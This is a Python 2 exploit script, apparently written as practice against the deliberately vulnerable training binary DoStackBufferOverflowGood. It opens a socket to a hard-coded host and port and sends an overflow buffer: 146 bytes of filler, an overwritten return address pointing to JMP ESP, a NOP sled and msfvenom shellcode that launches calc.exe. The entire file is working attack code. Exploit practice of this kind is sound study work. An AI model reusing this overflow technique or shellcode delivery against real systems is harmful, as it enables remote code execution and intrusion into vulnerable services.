#!/usr/bin/env python2 

#
# DoStackBufferOverflowGood Exploit
# Binary Author: justinsteven - https://github.com/justinsteven/dostackbufferoverflowgood
# Exploit Author: 0xsaso
#

import sys
import socket

target = "10.10.1.33"
port = 31337

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((target, port))

# start exploit
beg = ""

# offset is at 146
filler = "A" * 146

# JMP ESP is at 0x080414c3
eip = "\xc3\x14\x04\x08"

#badchars are x00 x0a
# msfvenom -p windows/exec --var-name shellcode CMD=calc.exe -b '\x00\x0a' -f python
shellcode =  ""
shellcode += "\xdb\xc1\xbd\xa6\x1b\xe0\x38\xd9\x74\x24\xf4"
shellcode += "\x5b\x31\xc9\xb1\x31\x31\x6b\x18\x83\xc3\x04"
shellcode += "\x03\x6b\xb2\xf9\x15\xc4\x52\x7f\xd5\x35\xa2"
shellcode += "\xe0\x5f\xd0\x93\x20\x3b\x90\x83\x90\x4f\xf4"
shellcode += "\x2f\x5a\x1d\xed\xa4\x2e\x8a\x02\x0d\x84\xec"
shellcode += "\x2d\x8e\xb5\xcd\x2c\x0c\xc4\x01\x8f\x2d\x07"
shellcode += "\x54\xce\x6a\x7a\x95\x82\x23\xf0\x08\x33\x40"
shellcode += "\x4c\x91\xb8\x1a\x40\x91\x5d\xea\x63\xb0\xf3"
shellcode += "\x61\x3a\x12\xf5\xa6\x36\x1b\xed\xab\x73\xd5"
shellcode += "\x86\x1f\x0f\xe4\x4e\x6e\xf0\x4b\xaf\x5f\x03"
shellcode += "\x95\xf7\x67\xfc\xe0\x01\x94\x81\xf2\xd5\xe7"
shellcode += "\x5d\x76\xce\x4f\x15\x20\x2a\x6e\xfa\xb7\xb9"
shellcode += "\x7c\xb7\xbc\xe6\x60\x46\x10\x9d\x9c\xc3\x97"
shellcode += "\x72\x15\x97\xb3\x56\x7e\x43\xdd\xcf\xda\x22"
shellcode += "\xe2\x10\x85\x9b\x46\x5a\x2b\xcf\xfa\x01\x21"
shellcode += "\x0e\x88\x3f\x07\x10\x92\x3f\x37\x79\xa3\xb4"
shellcode += "\xd8\xfe\x3c\x1f\x9d\xf1\x76\x02\xb7\x99\xde"
shellcode += "\xd6\x8a\xc7\xe0\x0c\xc8\xf1\x62\xa5\xb0\x05"
shellcode += "\x7a\xcc\xb5\x42\x3c\x3c\xc7\xdb\xa9\x42\x74"
shellcode += "\xdb\xfb\x20\x1b\x4f\x67\x89\xbe\xf7\x02\xd5"

nops = "\x90" * 20
end = "\n"

buff = (beg + filler + eip + nops + shellcode + end)

exploit.send(buff)

